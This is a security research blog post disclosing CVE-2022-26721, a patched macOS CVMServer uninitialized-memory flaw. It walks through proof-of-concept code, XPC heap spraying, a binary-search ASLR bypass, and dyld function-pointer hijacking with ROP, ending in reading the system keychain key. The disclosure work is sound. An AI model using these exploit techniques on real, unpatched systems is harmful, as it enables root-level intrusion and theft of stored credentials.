---
layout: post
title: "Binary-searching into CVMServer"
author: theori
description:
categories: [ research ]
tags: [ macOS, LPE ]
comments: true
featured: true
image: assets/images/2022-06-17/cvmserver.png
---

While analyzing the patch for [CVE-2021-30724](https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html) for writing a Fermium-252 report, I ([@jinmo123](https://twitter.com/jinmo123)) discovered a problem with the patch. The vulnerability was reported to Apple and patched in [macOS 12.4](https://support.apple.com/HT213257). It was fun to exploit.

## Background

When rendering OpenGL shaders on macOS with CPU, the program delegates shader compilation to the CVMServer daemon. It is compiled into native code and returned to the program as executable memory pages.

CVMServer is an XPC service running with root privileges (`com.apple.cvmsServ`),
[accessible from the Safari renderer sandbox:](https://github.com/WebKit/WebKit/blob/1cdb127409d6de7ffa69da49a388d1e510de1c73/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in#L320)

```lisp
;; CVMS
(allow mach-lookup
    (require-all
        (extension "com.apple.webkit.extension.mach")
        (global-name "com.apple.cvmsServ")
    )
)
```

Then, Mickey Jin of Trend Micro reported an integer underflow vulnerability ([CVE-2021-30724](https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html)).
However, the patch introduced a new uninitialized memory vulnerability. This article describes the vulnerability (CVE-2022-26721) and some knowledge gained during the exploitation process.

### Background: CVE-2021-30724

In CVMServer, `cvmsServInitializeConnection` processes XPC messages. The following code processes messages with the `"message"` field set to 10 or 18.

```c++
xpc_object_t content = xpc_dictionary_get_value(req, "source");
size_t count = xpc_array_get_count(content);
size_t descriptors = malloc(sizeof(size_t) * 4 * count);
size_t *accessBeginPointer = &descriptors[count * 0],
  *accessDataLength = &descriptors[count * 1],
  *mappedBaseAddress = &descriptors[count * 2],
  *mappedLength = &descriptors[count * 3];

for(size_t i = 0; i < count; i++) {
  accessBeginPointer[i] = accessDataLength[i] = 
  mappedBaseAddress[i] = mappedLength[i] = 0;

  xpc_object_t chunk = xpc_array_get_value(content, i);

  if(xpc_get_type(chunk) == XPC_TYPE_DATA) { ... }
  else if(xpc_get_type(chunk) == XPC_TYPE_SHMEM) {
    xpc_object_t map = xpc_array_get_value(chunk, 0);
    size_t offset = min(xpc_array_get_uint64(chunk, 1), 0xFFF),
    size = xpc_array_get_uint64(chunk, 2);
    
    size_t mapped_address;
    size_t mapped_size = xpc_shmem_map(map, &mapped_address); // [1]

    size = min(size, mapped_size - offset); // [2]
    ...
  }
}
```

The `mapped_size` [1] is usually aligned to 0x1000 (4KB) by `xpc_shmem_create`, which is a client-side operation.
But if you manipulate the size field before sending the XPC object,
`mapped_size` can be less than 4KB.
In this case, an integer underflow at `mapped_size - offset` [2] can occur.

```c
    xpc_object_t xshmem = xpc_shmem_create(shared_buf, size);
    uint64_t *p = (uint64_t *)(__bridge void *)xshmem;
    p[4] = 1; // patch the mapped size to a small one
```

<figcaption>Source: <a href="https://gist.github.com/jhftss/1bdb0f8340bfd56f7f645c080e094a8b">CVE-2021-30724 PoC code</a></figcaption>

This leads to OOB read/write in subsequent routines.

## Root Cause Analysis

The patch for CVE-2021-30724 added the code below to prevent the integer underflow in [2].

```c
    size_t mapped_address;
    size_t mapped_size = xpc_shmem_map(map, &mapped_address); // [1]

    /* Patch */
    if(mapped_size < offset) break; // [2]
```

However, when the `break` statement in [2] executes, the `i+1`-th element of `mappedBaseAddress` and `mappedLength` remains uninitialized, which becomes problematic in the cleanup part afterward.

```c
// cleanup
for(size_t index = 0; index < count; i++) {
  if(mappedLength[index]) {
    munmap(
      mappedBaseAddress[index] /* [3] */,
      mappedLength[index] /* [4] */
    );
  }
}
free(descriptors);
```

Here, [3] and [4] are all loaded from an uninitialized heap chunk. So the attacker can de-allocate arbitrary memory pages in the CVMServer process with `munmap` by controlling the uninitialized values.

Usually, it is done by allocating (`malloc`) a controlled string of the same size and then freeing it (`free`) in advance.

## Exploitation

To demonstrate the vulnerability,
from [the PoC code of CVE-2021-30724](https://gist.github.com/jhftss/1bdb0f8340bfd56f7f645c080e094a8b), change the number of `source` from 1 to 2. Executing the PoC multiple times will crash CVMServer due to the uninitialized value of `mappedLength[1]`.

```diff
-    xpc_dictionary_set_value(req, "source", xpc_array_create(&xarr, 1));
+    xpc_object_t array[] = { xarr, xarr };
+    xpc_dictionary_set_value(req, "source", xpc_array_create(array, 2));
     xpc_object_t res = xpc_connection_send_message_with_reply_sync(conn, req);
     printf("response: %s\n", xpc_copy_description(res)); 
```

The rest of the article will explain how to gain a code execution in sandboxed root privilege through this vulnerability.

1. Controlling uninitialized values on the heap
2. Inferring the daemon's memory layout using binary search
3. Manipulating dyld private memory and calling arbitrary functions

### 1. Controlling uninitialized values on the heap

To control the uninitialized value of the heap chunk, we create two values with the same key in the XPC dictionary object.
<!-- (`{"free": spray_value x N, "free": true}`) -->

```c
void spray_value(xpc_object_t msg, void *payload, size_t size) {
  xpc_object_t subdict = xpc_dictionary_create(NULL, NULL, 0);
  for (int i = 0; i < 0x500; i++) {
    xpc_dictionary_set_value(
      subdict,
      format("key%d", i),
      xpc_data_create(payload, size));
  }

  xpc_dictionary_set_value(msg, "free", subdict);
  xpc_dictionary_set_value(msg, "fref", xpc_bool_create(true));

  xpc_dictionary_apply(msg, ^bool(const char *key, xpc_object_t) {
    if (!memcmp(key, "fref", 4))
      memcpy((void *)key, "free", 4);
    return true;
  });
}
```

The deserialization code of the XPC receiver receives the second `"free"` key and frees the value `subdict` assigned to the first `"free"` key. This will be the pre-initialization contents of the allocated malloc chunk.

### 2. Inferring the daemon's memory layout using binary search

Unlike Linux, macOS terminates a process when freeing a non-allocated address with munmap. So, you need to know the memory layout of the target process in advance.

```
Exception Type:  EXC_GUARD (SIGKILL)
Exception Subtype: GUARD_TYPE_VIRT_MEMORY
Exception Message: offset=0x000000010f819000, flavor=0x00000001 (DEALLOC_GAP)
```

<figcaption>A crash occurs when calling munmap on a non-allocated address.</figcaption>

By design of macOS, the library address is the same for all processes so that attackers can know the library address in advance. However, the mmap function of macOS does not return the address after `0x7ff800000000`, and the library address is located after there, so the reallocation is not possible. So we need another address to call `munmap`.

As mentioned earlier, message handlers for #10 and #18 allocate the shared memory object sent to XPC several times within the CVMServer:

```c++
xpc_object_t content = xpc_dictionary_get_value(req, "source");
size_t count = xpc_array_get_count(content);

for(size_t i = 0; i < count; i++) {
    ...
    xpc_object_t map = xpc_array_get_value(chunk, 0);
    size_t mapped_size = xpc_shmem_map(map, &mapped_address);
    ...
}
```

If an attacker creates and transmits a shared memory larger than the memory allocated by the CVMServer, `xpc_shmem_map` will fail and return an error.
This behavior can create the following oracle.

```c
start = 0;
end   = (ADDR_END - ADDR_START) / 0x1000;
while(start < end) {
  mid = (start + end) / 2;
  bool success = invoke_cvm(xpc_shmem_create(mid * 0x1000));
  if(success) {
    end = mid - 1;
  } else {
    start = mid + 1;
  }
}
```

1. If the shared memory sent is not allocated, there is no address space of that size between all the memory maps of the target process.
2. Binary search for the largest allocable size using 1.
3. After getting the largest size, repeat it with more shared memory objects to acquire the size of the four largest gaps.

<div class="row justify-content-center">
<div class="col col-md-8">
<img src="../../assets/images/2022-06-17/out.gif" width="100%">
<figcaption>ASLR bypass using xpc_shmem_map() and binary search</figcaption>
</div>
</div>

Through this, we can get the memory map as below.

```plain
0x000100000000: [ gap:   `slide0`        ]
0x00010....000: [ binary: CVMServer      ]
                [ library: /usr/lib/dyld ]
                [ dyld private memory    ]
                [ gap #1          100TB  ] (mmap start)
0x7000.....000: [ thread stack           ]
                [ gap #2           10TB  ]
0x7f.......000: [ heap                   ]
                [ gap #3            1TB  ]
0x7ff......000: [ main thread stack      ]
                [ gap #4 `slide0` 200MB  ]
0x7ff800000000: 
```

mmap on macOS allocates memory sequentially starting after `dyld private memory`, and the distances between the memory maps are largest in the order of `gap #1 > ... > #4`. Therefore, when performing steps 1 to 3 above, we can get the size of gap #4 (=`slide0`).

Also, in macOS, the ASLR slide used for allocating the main program (CVMServer) and the main thread stack is the same (`slide0`). Therefore, the address of the main program can be calculated from the position of the end of the stack.

```c++
static load_return_t parse_machfile(...) {
  ...
  switch (lcp->cmd) {
  case LC_SEGMENT_64: {
    // Allocates binary at 0x000100000000 + slide
    ret = load_segment(lcp, ..., slide, result, imgp);
    break;
  }
  case LC_MAIN: {
    // Allocates stack at 0x7ff800000000 - slide - size
    ret = load_main(lcp, thread, slide, result);
    break;
  }
  }
}
```
<figcaption>
Source: <a href="https://github.com/apple-open-source/macos/blob/4c64a93f78278a48fd0c9bce26737010c16668e6/xnu/bsd/kern/mach_loader.c">XNU source code (bsd/kern/mach_loader.c)</a>
</figcaption>


In addition, macOS allows [overcommit](https://en.wikipedia.org/wiki/Memory_overcommitment), so you can allocate a memory map larger than the actual RAM size. This makes it possible to fill all those gaps with memory mapping. The backing memory is lazily allocated when a read/write access is attempted to the address. In our case, munmap is called without memory access, so memory does not run out.

### 3. Manipulating dyld private memory and calling arbitrary functions

In `dyld private memory`, there are various function pointers to dyld. If the page is overwritten with attacker-controlled contents after `munmap`, the modified function pointers are used instead when calling the `dlsym` or `dlopen` functions.

Closing the XPC connection will call the function pointer at offset `+0x330`, and you could also specify the contents pointed by the first argument.
Therefore, we performed stack pivot using `__setcontext` function and ROP.

`__setcontext` function in x86_64:

```c
__setcontext    proc near
    mov     rbx, [rdi+18h]
    mov     r12, [rdi+70h]
    mov     r13, [rdi+78h]
    mov     r14, [rdi+80h]
    mov     r15, [rdi+88h]
    mov     rsp, [rdi+48h]
    mov     rbp, [rdi+40h]
    xor     eax, eax
    jmp     qword ptr [rdi+90h]
__setcontext    endp
```

Since CVMServer can read arbitrary files in the system, I wrote a PoC that outputs the contents of `/var/db/SystemKey`. The content can be used to decrypt any keychain file within macOS using external tools, e.g. [chainbreaker](https://github.com/n0fate/chainbreaker).

<div class="row justify-content-center">
<div class="col col-md-8">
<img src="../../assets/images/2022-06-17/term.svg" width="100%">
<figcaption>Exploit demo</figcaption>
</div>
</div>

### Patch

Apple patched it in macOS 12.4 by replacing malloc with calloc.

```diff
-          v116 = malloc(32 * count);
+          v116 = calloc(1uLL, 32 * count);
```

## Conclusion

I was glad to have a chance to break ASLR with binary search.

#### Further Reading

- [CVE-2021-30724: CVMServer Vulnerability in macOS and iOS](https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html)
- [Poking Holes in Information Hiding, USENIX'16](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_oikonomopoulos.pdf)
- [Boston Key Party CTF 2017: hiddensc](https://github.com/Mike-Macelletti/ctf-writeups/blob/master/2017/boston-key-party/hiddensc.md)

---
